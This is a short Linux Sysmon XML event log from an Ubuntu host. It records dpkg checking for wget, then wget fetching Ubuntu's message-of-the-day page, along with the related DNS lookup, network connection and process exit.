<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-13T07:03:27.558814000Z"/><EventRecordID>33023493</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-13 07:03:27.562</Data><Data Name="ProcessGuid">{ec2d99e9-f03f-61b6-7071-5f0ad2550000}</Data><Data Name="ProcessId">18839</Data><Data Name="Image">/usr/bin/dpkg</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">dpkg -l wget</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">18838</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-13T07:03:27.559908000Z"/><EventRecordID>33023496</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-13 07:03:27.562</Data><Data Name="ProcessGuid">{ec2d99e9-f03f-61b6-a002-4897e2550000}</Data><Data Name="ProcessId">18839</Data><Data Name="Image">/usr/bin/dpkg-query</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">dpkg-query --list -- wget</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">18838</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-13T07:03:28.006011000Z"/><EventRecordID>33023813</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-13 07:03:28.012</Data><Data Name="ProcessGuid">{ec2d99e9-f040-61b6-70dc-20b21f560000}</Data><Data Name="ProcessId">18863</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget --timeout 60 -U wget/1.19.4-1ubuntu2.2 Ubuntu/18.04.6/LTS GNU/Linux/5.4.0-1060-aws/x86_64 Intel(R)/Xeon(R)/Platinum/8175M/CPU/@/2.50GHz cloud_id/aws -O- --content-on-error https://motd.ubuntu.com</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-f03f-61b6-68a2-8ae20e560000}</Data><Data Name="ParentProcessId">18824</Data><Data Name="ParentImage">/bin/dash</Data><Data Name="ParentCommandLine">/bin/sh</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-13T07:03:28.010242000Z"/><EventRecordID>33023814</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-13 07:03:28.016</Data><Data Name="ProcessGuid">{ec2d99e9-f040-61b6-70dc-20b21f560000}</Data><Data Name="ProcessId">18863</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.1</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">51408</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.53</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">53</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-13T07:04:28.153213000Z"/><EventRecordID>33025112</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-13 07:04:28.159</Data><Data Name="ProcessGuid">{ec2d99e9-f040-61b6-70dc-20b21f560000}</Data><Data Name="ProcessId">18863</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">10.0.1.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">38082</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">54.171.230.55</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">443</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-13T07:04:44.587819000Z"/><EventRecordID>33025721</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-13 07:04:44.594</Data><Data Name="ProcessGuid">{ec2d99e9-f040-61b6-70dc-20b21f560000}</Data><Data Name="ProcessId">18863</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data></EventData></Event>
